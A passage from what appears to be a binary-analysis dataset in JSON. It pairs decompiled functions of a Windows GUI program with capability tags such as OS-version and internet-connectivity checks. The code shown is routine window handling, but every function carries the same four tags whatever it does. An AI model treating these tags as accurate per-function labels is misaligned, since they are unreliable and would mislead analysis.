if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((iVar3 - in_EAX[0x12] & 1U) != 0);\n                    }\n                    puStack52 = 0x442557;\n                    iVar3 = fcn.004501f0();\n                    iVar8 = iVar3 - in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((iVar3 - in_EAX[0x13] & 1U) != 0);\n                    }\n                }\n                else {\n                    puStack52 = 0x442572;\n                    uVar4 = fcn.00443d50();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x442585;\n                    iVar6 = fcn.00443d38();\n                    iVar7 = in_EAX[0x12] >> 1;\n                    if (iVar7 < 0) {\n                        iVar7 = iVar7 + ((in_EAX[0x12] & 1U) != 0);\n                    }\n                    iVar7 = (iVar3 + iVar6) - iVar7;\n                    puStack52 = 0x4425a0;\n                    uVar4 = fcn.00443d44();\n                    iVar3 = uVar4 >> 1;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + ((uVar4 & 1) != 0);\n                    }\n                    puStack52 = 0x4425b3;\n                    iVar6 = fcn.00443d2c();\n                    iVar8 = in_EAX[0x13] >> 1;\n                    if (iVar8 < 0) {\n                        iVar8 = iVar8 + ((in_EAX[0x13] & 1U) != 0);\n                    }\n                    iVar8 = (iVar3 + iVar6) - iVar8;\n                }\n                puStack52 = 0x4425ce;\n                iVar3 = fcn.00443d38();\n                if (iVar7 < iVar3) {\n                    puStack52 = 0x4425dc;\n                    fcn.00443d38();\n                }\n                puStack52 = 0x4425e8;\n                iVar3 = fcn.00443d2c();\n                if (iVar8 < iVar3) {\n                    puStack52 = 0x4425f6;\n                    fcn.00443d2c();\n                }\n                puStack52 = in_EAX[0x12];\n                iStack56 = in_EAX[0x13];\n                uStack60 = 0x442615;\n                (**(*in_EAX + 0x88))();\n            }\n            *(in_EAX + 0x9e) = 0;\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if (*(in_EAX + 0x273) == '\\x02') {\n                    puStack52 = NULL;\n                    iStack56 = 0x442645;\n                    iStack56 = fcn.00458594();\n                    uStack60 = 0x223;\n                    sub.user32.dll_SendMessageA(*(*(*0x49ac1c + 0x44) + 0x29c));\n                    uVar5 = fcn.00458594(3);\n                    sub.user32.dll_ShowWindow(uVar5);\n                }\n                else {\n                    puStack52 = *(*(in_EAX + 0x273) * 4 + 0x49358c);\n                    iStack56 = 0x44268b;\n                    iStack56 = fcn.00458594();\n                    uStack60 = 0x442691;\n                    sub.user32.dll_ShowWindow();\n                    uStack60 = in_EAX[0x12] | in_EAX[0x13] << 0x10;\n                    uVar5 = fcn.00458594(5, 0);\n                    sub.user32.dll_CallWindowProcA(0x407ff8, uVar5);\n                    fcn.00450a94();\n                }\n                iStack56 = *(*(*0x49ac1c + 0x44) + 0x29c);\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                puStack52 = *(*(in_EAX + 0x273) * 4 + 0x49358c);\n                iStack56 = 0x4426fe;\n                iStack56 = fcn.00458594();\n                uStack60 = 0x442704;\n                sub.user32.dll_ShowWindow();\n            }\n        }\n    }\n    else if ((((*(in_EAX + 7) & 0x10) != 0) && (in_EAX[0xc] != 0)) && (*(in_EAX + 0x1da) != '\\0')) {\n        puStack52 = 0x1;\n        iStack56 = 0x44283d;\n        puStack40 = &stack0xfffffffc;\n        iStack56 = fcn.00458594();\n        uStack60 = 0x442843;\n        sub.user32.dll_ShowWindow();\n    }\n    *in_FS_OFFSET = iStack56;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) & 0xfb;\n    return;\n}\n",
        "token_count": 3706
    },
    "00442908": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442908(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x59) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            puStack16 = 0x442934;\n            fcn.004244d4();\n            uStack20 = 0x442966;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            (**(**(in_EAX + 0x68) + 8))();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x44296d;\n            uStack20 = 0x442965;\n            fcn.00404650();\n            return;\n        }\n        puStack16 = 0x442926;\n        (**(**(in_EAX + 0x68) + 8))();\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "004429a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004429a0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    char cStack12;\n    \n    if ((*(in_EAX + 0xd6) & 8) == 0) {\n        cVar1 = (**(*in_EAX + 0xf4))();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x277) == '\\x01') {\n                if ((*(in_EAX + 0x9c) & 2) == 0) {\n                    cStack12 = '\\0';\n                }\n                else {\n                    cStack12 = '\\x03';\n                }\n            }\n            else {\n                cStack12 = '\\x01';\n            }\n            fcn.0040484c();\n            if (cStack12 != '\\0') {\n                if (in_EAX == *(*0x49ac1c + 0x44)) {\n                    fcn.004466d0();\n                }\n                else if (cStack12 == '\\x01') {\n                    fcn.00442b40();\n                }\n                else if (cStack12 == '\\x03') {\n                    fcn.0043fd50();\n                }\n                else {\n                    fcn.00442c1c();\n                }\n            }\n        }\n    }\n    else {\n        in_EAX[0xa5] = 2;\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "00442b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442b60(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x442bdf;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x276) != '\\0') goto code_r0x00442bc9;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x57) == '\\0') {\ncode_r0x00442b90:\n        puStack16 = puVar1;\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            cVar2 = fcn.004588a0();\n            if (cVar2 != '\\0') goto code_r0x00442bc2;\n        }\n        fcn.00407550();\n        fcn.0040db04();\n        fcn.00404ec4();\n    }\n    else {\n        cVar2 = (**(*in_EAX + 0x50))();\n        puVar1 = puStack16;\n        if (cVar2 == '\\0') goto code_r0x00442b90;\n    }\ncode_r0x00442bc2:\n    fcn.00440e40();\ncode_r0x00442bc9:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x442be6;\n    uStack20 = 0x442bde;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 395
    },
    "00442c38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442c38(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x442f2a;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x442c5b;\n    fcn.0044ed5c();\n    if (*(in_EAX + 0x57) == '\\0') {\n        puStack60 = 0x442c6c;\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && ((*(in_EAX + 0xd6) & 8) == 0)) && (*(in_EAX + 0x277) != '\\x01')) goto code_r0x00442ca9;\n    }\n    puStack60 = 0x442c95;\n    fcn.00407550();\n    puStack60 = 0x442ca4;\n    fcn.0040db04();\n    puStack60 = 0x442ca9;\n    fcn.00404ec4();\ncode_r0x00442ca9:\n    puStack60 = 0x442cae;\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        puStack60 = NULL;\n        uStack64 = 0;\n        uStack68 = 0x1f;\n        puStack72 = 0x442cbd;\n        puStack72 = sub.user32.dll_GetCapture();\n        uStack76 = 0x442cc3;\n        sub.user32.dll_SendMessageA();\n    }\n    puStack60 = 0x442cc8;\n    sub.user32.dll_ReleaseCapture();\n    puStack60 = 0x442cd2;\n    fcn.00445374();\n    uStack64 = 0x442f0d;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *(in_EAX + 0xd6) = *(in_EAX + 0xd6) | 8;\n    puStack60 = &stack0xfffffffc;\n    if ((*(in_EAX + 0xcc) == '\\0') && (puStack60 = &stack0xfffffffc,  *(*0x49ac1c + 0xd4) != '\\0')) {\n        puStack72 = 0x442d0c;\n        puStack60 = &stack0xfffffffc;\n        fcn.00454f8c();\n        puStack72 = 0x442d14;\n        fcn.00458570();\n    }\n    puStack72 = 0x442d19;\n    sub.user32.dll_GetActiveWindow();\n    puStack72 = 0x442d21;\n    fcn.0043b718();\n    puStack72 = 0x442d3b;\n    fcn.00419930();\n    *(*0x49ac20 + 0x78) = in_EAX;\n    puStack72 = 0x442d5f;\n    fcn.00444244();\n    puStack72 = 0x442d71;\n    fcn.0043b8bc();\n    uStack76 = 0x442eeb;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack84 = 0x442d8a;\n    puStack72 = &stack0xfffffffc;\n    fcn.00442b48();\n    uStack88 = 0x442e4a;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar3 = fcn.00458594(0xb000, 0, 0);\n    sub.user32.dll_SendMessageA(uVar3);\n    in_EAX[0xa5] = 0;\n    do {\n        fcn.004465d4();\n        if (*(*0x49ac1c + 0xa4) == '\\0') {\n            if (in_EAX[0xa5] != 0) {\n                fcn.00442aa8();\n            }\n        }\n        else {\n            in_EAX[0xa5] = 2;\n        }\n    } while (in_EAX[0xa5] == 0);\n    uVar3 = fcn.00458594(0xb001, 0, 0);\n    sub.user32.dll_SendMessageA();\n    fcn.00458594();\n    sub.user32.dll_GetActiveWindow();\n    *in_FS_OFFSET = uVar3;\n    fcn.00442b40(0x442e51);\n    return;\n}\n",
        "token_count": 1195
    },
    "00442f3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442f3c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454684(),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00454648();\n            if (((*(piVar3 + 0x51) & 0x80) != 0) && (*(piVar3 + 0x57) != '\\0')) {\n                (**(*piVar3 + 0x7c))();\n            }\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                fcn.00442f3c(arg_8h);\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00442fac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00442fac(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (((*(in_EAX + 7) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        (**(*in_EAX + 0x7c))();\n        if ((in_EAX[0xa4] != 0) && (iVar1 = fcn.0043653c(),  -1 < iVar1 + -1)) {\n            do {\n                piVar2 = fcn.0043654c();\n                if (*(piVar2 + 0x3e) != '\\0') {\n                    (**(*piVar2 + 0x40))();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00442f3c(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00443084": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443084(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454684(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00454648();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00443054(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.00443084(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "00443100": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443100(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.00443054(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00443054(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00443084(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00443184": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443184(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00454684(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.00454648();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.00443154(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004047dc(),  cVar1 != '\\0' && (cVar1 = fcn.00443184(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "00443200": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443200(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.00443154(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.00443154(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.00443184(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00443254": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.00443254(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char var_5h;\n    uint var_4h;\n    \n    var_5h = '\\0';\n    iVar2 = fcn.004205b0();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00420584();\n            cVar1 = fcn.004047dc();\n            if (cVar1 == '\\0') {\n                var_5h = fcn.00443254(arg_8h);\n                if (var_5h != '\\0') {\n                    return var_5h;\n                }\n            }\n            else {\n                cVar1 = fcn.0044a314();\n                if (cVar1 != '\\0') {\n                    return '\\x01';\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return var_5h;\n}\n",
        "token_count": 219
    },
    "004432d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.004432d0(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30a) != 0) {\n        (**(in_EAX + 0x308))();\n    }\n    if ((((*(in_EAX + 0x290) == 0) || (*(*(in_EAX + 0x290) + 0x38) == 0)) || (cVar1 = fcn.0040484c(),  cVar1 == '\\0'))\n       && (cVar1 = fcn.00443254(&stack0xfffffffc),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "00443348": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443348(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x298) != 0) && (iVar1 = (****(arg_8h + 0x298))(*(arg_8h + 0x298), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.0042071c(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 145
    },
    "004433cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004433cc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x493504 != NULL)) {\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00458594(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x328) == '\\0') && (*(in_EAX + 0x350) == '\\0')) {\n                uVar2 = fcn.00458594(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.00458594(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.00458594(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar2 = fcn.00458594(*(in_EAX + 0x354), *(in_EAX + 0x329), \n                                     *(*(in_EAX + 0x328) * 4 + 0x493598) | *(*(in_EAX + 0x350) * 4 + 0x4935a0));\n                (**0x493504)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "004434e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004434e0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != *(in_EAX + 0x350)) {\n        *(in_EAX + 0x350) = param_2;\n        if (*(in_EAX + 0x350) != '\\0') {\n            iVar1 = fcn.00447dd8();\n            if (*(iVar1 + 8) != '\\0') {\n                fcn.00447dd8();\n                fcn.004480fc();\n            }\n        }\n        fcn.004433cc();\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00443520": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443520(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x493504 != 0)) &&\n       ((*(in_EAX + 0x328) != '\\0' || (*(in_EAX + 0x350) != '\\0')))) {\n        *(param_2 + 8) = *(param_2 + 8) | 0x80000;\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004435c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004435c8(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xf0))();\n    fcn.0043cbdc();\n    fcn.0043f254();\n    fcn.004570bc();\n    fcn.0043f674();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 190
    },
    "00443af4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00443af4(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff70();\n    puVar2 = *0x4958c4;\n    (*0x4958c4)[1] = in_EAX;\n    *puVar2 = 0x443e98;\n    puVar2 = *0x4958d0;\n    (*0x4958d0)[1] = in_EAX;\n    *puVar2 = 0x443ea4;\n    fcn.00443eb0();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x495a80)(0, 0, fcn.0043f560, *(in_EAX + 0x58));\n    uVar3 = fcn.004244d4();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.004244d4();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.004244d4();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.004442e0();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4441b0;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4441b0;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4441b0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 781
    },
    "00443dc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443dc4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00443e48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00443e48(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004199f8();\n    fcn.004199f8();\n    fcn.00447160();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x49ac1c + 0x84) != 0)) {\n        fcn.00459cc0();\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00443f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
